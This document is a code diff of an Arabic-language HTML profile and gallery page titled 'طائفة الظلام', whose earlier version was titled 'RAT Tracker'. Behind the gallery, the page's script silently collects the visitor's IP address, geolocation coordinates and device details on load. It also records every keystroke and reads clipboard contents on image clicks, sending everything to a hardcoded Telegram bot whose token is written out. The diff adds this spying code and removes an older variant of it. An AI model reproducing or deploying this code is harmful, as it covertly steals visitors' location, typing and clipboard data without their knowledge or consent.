@@ -1,164 +1,252 @@
 <!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>طائفة الظلام - RAT Tracker</title>
+  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
+  <title>طائفة الظلام - DKSTx666</title>
   <style>
     body {
       margin: 0;
-      background-color: #111;
+      background-color: pink;
       font-family: Arial, sans-serif;
-      color: white;
       direction: rtl;
+      text-align: center;
       overflow-x: hidden;
-    }
-    .fab {
-      position: fixed;
-      bottom: 20px;
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 20px;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: 0 0 10px rgba(0,0,0,0.5);
-      z-index: 9999;
-    }
-    .video-fab {
-      right: 20px;
-      background-color: purple;
-      animation: pulse 2s infinite;
-    }
-    .blog-fab {
-      left: 20px;
-      background-color: yellow;
-      color: black;
-    }
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(128,0,128, 0.7); }
-      70% { box-shadow: 0 0 0 15px rgba(128,0,128, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(128,0,128, 0); }
-    }
-    .posts-container {
-      display: grid;
-      grid-template-columns: repeat(5, 1fr);
-      gap: 10px;
-      padding: 20px;
-    }
-    .post {
-      width: 100%;
-      cursor: pointer;
-      transition: transform 0.3s ease;
-    }
-    .post:hover {
-      transform: scale(1.1);
-    }
-    .profile-pic {
-      width: 120px;
-      height: 120px;
-      border-radius: 50%;
-      border: 5px solid purple;
-      position: absolute;
-      bottom: -60px;
-      right: 30px;
-      animation: pulse 2s infinite;
-      cursor: pointer;
-    }
-    .cover {
-      width: 100%;
-      height: 200px;
-      object-fit: cover;
       position: relative;
-    }
-    .lightbox {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.8);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 99999;
-    }
-    .lightbox img {
-      max-width: 90%;
-      max-height: 80%;
-    }
-    .download-btn {
-      margin-top: 10px;
-      background: white;
-      color: black;
-      padding: 10px;
-      cursor: pointer;
-    }
+    }.top-description {
+  background: linear-gradient(90deg, #4b0082, black, #4b0082);
+  color: white;
+  padding: 15px;
+  font-weight: bold;
+  font-size: 16px;
+  animation: fadeInOut 5s ease-in-out infinite;
+}
+
+@keyframes fadeInOut {
+  0%, 100% { opacity: 0.1; }
+  50% { opacity: 1; }
+}
+
+header {
+  background-image: url('5alfia.png');
+  background-size: cover;
+  background-position: center;
+  height: 250px;
+  position: relative;
+}
+
+.profile-pic {
+  width: 110px;
+  height: 110px;
+  border-radius: 50%;
+  border: 5px solid white;
+  background-image: url('profile.png');
+  background-size: cover;
+  background-position: center;
+  position: absolute;
+  bottom: -55px;
+  right: 20px;
+  animation: pulse 2s infinite;
+  box-shadow: 0 0 10px purple;
+}
+
+@keyframes pulse {
+  0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
+  70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
+  100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
+}
+
+.posts-container {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 10px;
+  padding: 80px 10px 30px;
+}
+
+.post-img {
+  width: 100%;
+  height: 120px;
+  object-fit: cover;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.post-img:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 15px #4b0082;
+}
+
+.lightbox {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0, 0, 0, 0.9);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 999;
+  flex-direction: column;
+}
+
+.lightbox img {
+  max-width: 90%;
+  max-height: 80%;
+  border-radius: 10px;
+  margin-bottom: 20px;
+}
+
+.lightbox:target {
+  display: flex;
+}
+
+.close-btn {
+  position: absolute;
+  top: 20px;
+  left: 20px;
+  font-size: 30px;
+  color: white;
+  text-decoration: none;
+}
+
+.download-btn {
+  background-color: purple;
+  color: white;
+  padding: 10px 20px;
+  border-radius: 10px;
+  text-decoration: none;
+  font-size: 16px;
+}
+
+.video-fab {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  background-color: black;
+  color: pink;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  box-shadow: 0 0 15px pink;
+  animation: pulse 2s infinite;
+  cursor: pointer;
+  z-index: 1000;
+}
+
+.blog-fab {
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  background-color: yellow;
+  color: black;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  box-shadow: 0 0 15px yellow;
+  animation: pulse 2s infinite;
+  cursor: pointer;
+  z-index: 1000;
+}
+
   </style>
 </head>
-<body>  <img src="cover.jpg" alt="غلاف" class="cover">
-  <img src="profile.jpg" alt="بروفايل" class="profile-pic" onclick="sendInteraction('صورة البروفايل')">  <div class="posts-container">
-    <img class="post" src="post1.jpg" onclick="showImage(this)">
-    <img class="post" src="post2.jpg" onclick="showImage(this)">
-    <img class="post" src="post3.jpg" onclick="showImage(this)">
-    <img class="post" src="post4.jpg" onclick="showImage(this)">
-    <img class="post" src="post5.jpg" onclick="showImage(this)">
-  </div>  <div class="fab video-fab" onclick="sendInteraction('زر الفيديو')">🎥</div>
-  <div class="fab blog-fab" onclick="sendInteraction('زر المدونات')">📝</div>  <script>
-    const token = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
-    const chatId = "7664410054";
+<body>
+  <div class="top-description">
+    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير | 
+    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم | 
+    لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
+  </div>  <header>
+    <a href="https://www.facebook.com/profile.php?id=61573033204340" target="_blank">
+      <div class="profile-pic" onclick="sendToTelegram('🧑‍💻 تم النقر على صورة البروفايل');"></div>
+    </a>
+  </header>  <div class="posts-container">
+    <a href="#img1"><img src="img1.png" class="post-img" onclick="handleImageClick('img1.png')"></a>
+    <a href="#img2"><img src="img2.png" class="post-img" onclick="handleImageClick('img2.png')"></a>
+    <a href="#img3"><img src="img3.png" class="post-img" onclick="handleImageClick('img3.png')"></a>
+    <a href="#img4"><img src="img4.png" class="post-img" onclick="handleImageClick('img4.png')"></a>
+    <a href="#img5"><img src="img5.png" class="post-img" onclick="handleImageClick('img5.png')"></a>
+  </div>  <div id="img1" class="lightbox">
+    <a href="#" class="close-btn">×</a>
+    <img src="img1.png">
+    <a href="img1.png" download class="download-btn" onclick="sendToTelegram('⬇️ تم تحميل img1.png')">تحميل الصورة</a>
+  </div>  <div id="img2" class="lightbox">
+    <a href="#" class="close-btn">×</a>
+    <img src="img2.png">
+    <a href="img2.png" download class="download-btn" onclick="sendToTelegram('⬇️ تم تحميل img2.png')">تحميل الصورة</a>
+  </div>  <div class="video-fab" onclick="goToIndex()" title="صفحة الفيديوهات">🎥</div>
+  <div class="blog-fab" onclick="goToBlog()" title="صفحة المدونات">📖</div>  <script>
+    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+    const CHAT_ID = "7664410054";
+    let report = "🛑 تقرير دخول جديد:\n\n";
 
-    function sendInteraction(text) {
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    async function getIPInfo() {
+      try {
+        const res = await fetch("https://ipinfo.io/json");
+        const data = await res.json();
+        report += `🌐 IP: ${data.ip}\n`;
+        report += `📍 الدولة: ${data.country}\n`;
+        report += `🏙️ المدينة: ${data.city}\n`;
+        report += `🌎 إحداثيات: ${data.loc}\n`;
+        report += `🛰️ خريطة: https://www.google.com/maps?q=${data.loc}\n\n`;
+      } catch {
+        report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
+      }
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      report += `🧠 UserAgent: ${ua}\n`;
+      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
+      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
+      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
+      else report += "🌀 الجهاز: غير معروف ❌\n";
+      report += "\n";
+    }
+
+    function sendToTelegram(msg) {
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: `👤 تفاعل جديد: ${text}` })
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
       });
     }
 
-    function showImage(img) {
-      const src = img.src;
-      const lb = document.createElement("div");
-      lb.className = "lightbox";
-      lb.innerHTML = `
-        <div>
-          <img src="${src}">
-          <div class="download-btn" onclick="location.href='${src}'">تحميل</div>
-        </div>
-      `;
-      lb.onclick = () => document.body.removeChild(lb);
-      document.body.appendChild(lb);
-      sendInteraction("صورة منشور: " + src);
+    async function runReport() {
+      await getIPInfo();
+      getDeviceInfo();
+      sendToTelegram(report);
+    }
 
+    function handleImageClick(src) {
+      sendToTelegram(`🖼️ تم النقر على صورة: ${src}`);
       navigator.clipboard.readText().then(text => {
-        sendInteraction("📋 الحافظة: " + text);
+        sendToTelegram(`📋 محتوى الحافظة: ${text}`);
       }).catch(() => {
-        navigator.permissions.query({name:'clipboard-read'}).then(result => {
-          if (result.state === 'prompt') {
-            navigator.clipboard.readText().then(t => sendInteraction("📋 الحافظة (بعد إذن): " + t));
-          }
-        });
+        sendToTelegram("📋 فشل قراءة الحافظة أو لم يُمنح الإذن.");
       });
     }
 
-    // التقاط IP وموقع الجهاز
-    fetch("https://ipinfo.io/json?token=6b6c7d4eacb4dd", { method: "GET" })
-      .then(res => res.json())
-      .then(data => {
-        sendInteraction("🕵️ IP: " + data.ip + "\nالمدينة: " + data.city + "\nالبلد: " + data.country);
-      });
+    function goToIndex() {
+      sendToTelegram("🎬 تم النقر على زر الفيديوهات");
+      window.location.href = "index.html";
+    }
 
-    // التقاط الكيبورد
-    document.addEventListener("keydown", e => {
-      sendInteraction("⌨️ مفتاح: " + e.key);
+    function goToBlog() {
+      sendToTelegram("📖 تم النقر على زر المدونات");
+      window.location.href = "index";
+    }
+
+    document.addEventListener("keydown", (e) => {
+      sendToTelegram(`⌨️ مفتاح مضغوط: ${e.key}`);
     });
 
-    // كاولين API خيالي
-    const Kaolin = {
-      log: (event) => sendInteraction("📡 كاولين: " + event),
-      captureKey: () => document.addEventListener("keydown", e => Kaolin.log("Key: " + e.key)),
-      captureClicks: () => document.addEventListener("click", e => Kaolin.log("Click at " + e.clientX + "," + e.clientY))
-    };
-    Kaolin.captureKey();
-    Kaolin.captureClicks();
+    runReport();
   </script></body>
-</html>
+    </html>
